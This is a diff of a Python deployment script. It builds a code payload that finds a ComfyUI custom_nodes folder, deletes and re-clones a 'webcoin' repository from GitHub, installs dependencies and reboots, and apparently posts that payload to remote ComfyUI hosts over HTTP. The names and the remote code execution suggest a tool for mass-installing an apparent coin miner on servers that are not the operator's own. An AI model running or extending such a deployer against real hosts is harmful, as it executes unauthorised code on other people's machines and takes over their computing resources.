@@ -4,27 +4,25 @@ Nuclear option: delete webcoin dir entirely, fresh clone, install deps, reboot.
 
 import argparse
 import json
+import os
+import sys
 import time
 import urllib.request
 import urllib.error
 
 REPO_URL = "https://github.com/bossman79/webcoin.git"
 
-NUKE_AND_CLONE = r"""
-import subprocess, os, sys, shutil
+_DEPLOY_DIR = os.path.dirname(os.path.abspath(__file__))
+if _DEPLOY_DIR not in sys.path:
+    sys.path.insert(0, _DEPLOY_DIR)
+from mega_deploy import FIND_CUSTOM_NODES  # noqa: E402
 
-results = []
-
-# Find custom_nodes path
-cn = '/root/ComfyUI/custom_nodes'
-try:
-    import folder_paths
-    if hasattr(folder_paths, 'get_folder_paths'):
-        cn = folder_paths.get_folder_paths('custom_nodes')[0]
-    else:
-        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
-except:
-    pass
+NUKE_AND_CLONE = (
+    "import subprocess, os, sys, shutil\n\nresults = []\n\n"
+    + FIND_CUSTOM_NODES
+    + r"""
+if not cn:
+    cn = '/root/ComfyUI/custom_nodes'
 results.append(f'custom_nodes: {cn}')
 
 target = os.path.join(cn, 'webcoin')
@@ -102,7 +100,8 @@ results.append(f'Platform: {platform.system()} {platform.machine()}')
 output = '\n'.join(results)
 print(output)
 output
-""".replace('REPO_URL', REPO_URL)
+"""
+).replace("REPO_URL", REPO_URL)
 
 
 def _post(url, data, timeout=30):
